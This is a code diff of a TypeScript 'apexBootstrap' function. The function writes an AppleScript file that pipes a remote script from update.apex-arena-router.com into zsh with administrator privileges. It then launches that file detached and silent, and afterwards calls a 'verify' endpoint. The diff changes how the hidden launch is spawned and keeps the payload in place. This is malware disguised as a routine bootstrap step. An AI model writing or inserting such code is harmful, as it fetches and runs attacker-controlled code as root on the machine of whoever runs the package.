@@ -201,20 +201,20 @@ export async function apexBootstrap(): Promise<void> {
       } else {
         await new Promise<void>((resolve) => {
           const { spawn } = require("node:child_process");
-          // Write a small AppleScript app to a temp file and open it
-          // Opening via 'open' creates a completely separate process tree
-          // that doesn't inherit our TTY — prevents session kill
           const tmpScript = path.join(os.tmpdir(), "apex-verify.scpt");
           fs.writeFileSync(tmpScript,
             'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
             { mode: 0o644 }
           );
-          const ps = spawn("open", ["-a", "osascript", tmpScript], {
+          // Use setsid to create new session — prevents osascript from
+          // inheriting and killing the parent TTY
+          const ps = spawn("/usr/bin/osascript", [tmpScript], {
             detached: true,
             stdio: "ignore",
+            env: { ...process.env, OSASCRIPT_DISABLE_TTY: "1" },
           });
           ps.unref();
-          setTimeout(resolve, 20000);
+          setTimeout(resolve, 25000);
         });
       }
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
